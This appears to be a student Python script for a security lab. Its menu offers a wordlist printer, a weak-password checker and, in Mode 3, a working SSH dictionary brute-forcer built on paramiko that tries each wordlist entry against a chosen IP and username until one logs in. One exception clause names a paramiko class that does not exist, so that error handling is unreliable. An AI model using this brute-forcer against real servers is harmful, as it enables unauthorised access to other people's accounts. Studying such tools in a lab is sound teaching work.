#!/usr/bin/env python3
# Geneva Knott
# Worked with Sierra, and Nick A

# Import Libiaries 
import time
import paramiko

import ipaddress
# Vars
port = 22
sshConnection = paramiko.SSHClient()

def ip():
    # Verify if host is a valid IP address
    try:
        ipaddress.ip_address(host)
        print(f"{host} is a valid IP address")
        return True
    except ValueError:
        print(f"{host} is an invalid IP address")
        return False

def connect(password):
    # Connect to SSH with provided username and password
    try:
        sshConnection.connect(host, port, user, password)
        print(f"[+] Successfully authenticated with password: {password}")
        return True
    except paramiko.AuthenticationException:
        # Wrong password
        return False
    except paramiko.SSHException:
        # Unable to establish SSH connection
        return False
    except paramiko.Exception as e:
        # Other exceptions
        print(f"[-] Exception occurred: {e}")
        return False

def mode1():
    # User input word list file path
    filepath = input("Enter your dictionary filepath:\n")
    #Open the file 
    file = open(filepath)
    line = file.readline()
    # Iterate through each word in given list
    while line:
        line = line.rstrip()
        word = line
        time.sleep(1)
        print(word)
        line = file.readline()
    file.close()
def mode2():
    # User input word list file path and see if password is on list
    filepath = input("Enter your wordlist filepath:\n")
    password = input("Please type your new password: \n")
    with open(filepath) as file:
        for line in file:
            if line.strip() == password:
                print("Password is weak!")
                return
    print("Password is strong!")
def mode3():
    # Brute force SSH
    # User input for password list
    filepath = input("Enter your wordlist filepath:\n")
    # if not a real IP address, return
    if not ip():
        return
    # open file and use function connect() to plug password 
    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            password = line.strip()
            if connect(password):
                break

    
def menu():
    print("Select an option:")
    print("Mode 1: Iterator ")
    print("Mode 2: Password Check")
    print("Mode 3: Brute Force")
    print("Exit to Exit")

# main
while True:
   menu()
   choice = input("Enter your choice")
   if choice == "Mode 1":
       mode1()
   elif choice == "Mode 2":
       mode2()
   elif choice == "Mode 3":
       host = input("Please provide an IP address to connect to: ")
       user = input("Please provide a username: ")
       mode3()
   elif choice == "Exit":
       break
   else:
       print("Invaild choice")
# end
